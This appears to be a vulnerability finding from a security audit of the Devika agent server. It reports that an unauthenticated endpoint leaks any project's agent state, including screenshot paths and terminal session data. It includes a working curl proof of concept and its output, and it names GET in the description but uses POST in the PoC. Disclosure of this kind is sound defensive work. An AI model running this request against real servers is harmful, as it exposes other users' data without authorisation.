# F-H-STATE-1: Cross-project agent-state access

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
`GET /api/get-agent-state` in `devika.py:116-120` serves any project's agent state stack verbatim (including server-side screenshot paths and terminal session data) with no authentication or ownership check.

## Impact
Unauthenticated client reads cross-project state/data.

## PoC
```bash
curl -X POST "http://<host>:1337/api/get-agent-state" \
  -H "Content-Type: application/json" \
  -d '{"project_name": "victim-project"}'
```

## Execution result
```
[STATE] HTTP 200, endpoint responds without auth
```
